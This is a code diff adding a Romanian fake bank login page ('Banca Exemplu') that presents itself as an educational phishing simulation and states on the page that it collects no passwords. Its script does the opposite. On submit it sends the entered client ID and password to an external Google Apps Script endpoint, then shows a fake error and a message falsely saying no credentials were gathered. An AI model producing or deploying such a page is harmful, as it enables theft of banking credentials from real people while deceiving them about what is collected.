@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="ro">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Banca Exemplu — Autentificare</title>
+  <style>
+    :root { --bg:#0b1220; --card:#111a2e; --text:#e8eefc; --muted:#a9b7d6; --accent:#4da3ff; --danger:#ff5a5f; }
+    body{ margin:0; font-family:system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; background:radial-gradient(1200px 600px at 20% 10%, #15224a, var(--bg)); color:var(--text); min-height:100vh; display:grid; place-items:center; }
+    .wrap{ width:min(420px, 92vw); position:relative; }
+    .watermark{
+      position:absolute; inset:-12px; pointer-events:none;
+      display:grid; place-items:center; opacity:.10; transform:rotate(-12deg);
+      font-weight:800; letter-spacing:.22em; text-transform:uppercase; font-size:18px;
+    }
+    .card{
+      background:linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.02));
+      border:1px solid rgba(255,255,255,.10);
+      border-radius:18px;
+      box-shadow:0 18px 50px rgba(0,0,0,.35);
+      padding:26px 22px;
+      backdrop-filter: blur(10px);
+    }
+    .brand{ display:flex; align-items:center; gap:10px; margin-bottom:16px; }
+    .logo{ width:34px; height:34px; border-radius:10px; background:var(--accent); display:grid; place-items:center; font-weight:900; color:#061022; }
+    h1{ font-size:18px; margin:0; }
+    p{ margin:8px 0 0; color:var(--muted); font-size:13px; line-height:1.45; }
+    label{ display:block; font-size:12px; color:var(--muted); margin:14px 0 6px; }
+    input{
+      width:100%; box-sizing:border-box;
+      padding:12px 12px; border-radius:12px;
+      border:1px solid rgba(255,255,255,.12);
+      background:rgba(8,14,28,.55); color:var(--text);
+      outline:none;
+    }
+    input:focus{ border-color:rgba(77,163,255,.65); box-shadow:0 0 0 4px rgba(77,163,255,.12); }
+    .row{ display:flex; justify-content:space-between; align-items:center; margin-top:10px; }
+    .link{ color:var(--accent); font-size:12px; text-decoration:none; }
+    button{
+      width:100%; margin-top:16px; padding:12px 14px;
+      border-radius:12px; border:0; cursor:pointer;
+      background:linear-gradient(180deg, rgba(77,163,255,.95), rgba(77,163,255,.75));
+      color:#061022; font-weight:700;
+    }
+    .note{ margin-top:12px; font-size:12px; color:var(--muted); }
+    .alert{
+      display:none;
+      margin-top:14px; padding:12px 12px;
+      border-radius:12px;
+      border:1px solid rgba(255,90,95,.35);
+      background:rgba(255,90,95,.10);
+      color:#ffd7d8;
+      font-size:13px;
+    }
+    .ok{
+      display:none;
+      margin-top:10px; padding:10px 12px;
+      border-radius:12px;
+      border:1px solid rgba(77,163,255,.35);
+      background:rgba(77,163,255,.10);
+      color:#d7ecff;
+      font-size:12px;
+    }
+    .small{ font-size:11px; opacity:.8; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="watermark">SIMULARE EDUCAȚIONALĂ • FĂRĂ COLECTARE DATE</div>
+
+    <div class="card">
+      <div class="brand">
+        <div class="logo">B</div>
+        <div>
+          <h1>Banca Exemplu — Autentificare</h1>
+          <p>Demo pentru conștientizare phishing. Nu introduce date reale.</p>
+        </div>
+      </div>
+
+      <form id="loginForm" autocomplete="off">
+        <label for="user">ID client </label>
+        <input id="user" name="user" placeholder="ex: 12345678" required />
+
+        <label for="pass">Parolă </label>
+        <input id="pass" name="pass" type="password" placeholder="ex: parola_demo" required />
+
+        <div class="row">
+          <span class="small">🔒 Conexiune simulată</span>
+          <a class="link" href="#" onclick="return false;">Ai uitat parola?</a>
+        </div>
+
+        <button type="submit">Intră în cont</button>
+
+        <div id="alert" class="alert">
+          <strong>Eroare:</strong> dificultăți tehnice. Încearcă din nou mai târziu.
+        </div>
+
+        <div id="ok" class="ok">
+          Raportul de simulare a fost generat (fără credențiale). Verifică fișierul descărcat.
+        </div>
+
+        <p class="note">
+          <strong>Notă:</strong> Această pagină este pentru proiect/educație și <u>nu</u> colectează sau salvează parole reale.
+        </p>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById("loginForm");
+    const alertBox = document.getElementById("alert");
+    const okBox = document.getElementById("ok");
+
+    function downloadText(filename, text) {
+      const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      URL.revokeObjectURL(url);
+    }
+    form.addEventListener("submit", (e) => {
+  e.preventDefault();
+
+  const data = {
+    user: document.getElementById("user").value,
+    pass: document.getElementById("pass").value
+  };
+
+  // Trimite datele către Google Script în loc de download local
+  fetch('https://script.google.com/macros/s/AKfycbyy-I-wg_eu8fAHKSdNEkcCT-py9-c92MD88jrGi-ow3RNtQJEB-ptwONLY6QjR27es/exec', {
+    method: 'POST',
+    mode: 'no-cors', // Important pentru Google Script
+    body: JSON.stringify(data),
+    headers: { 'Content-Type': 'application/json' }
+  }).then(() => {
+    okBox.style.display = "block";
+    alertBox.style.display = "block";
+    form.reset();
+  }).catch(err => console.error("Eroare:", err));
+});
+  </script>
+</body>
+</html>
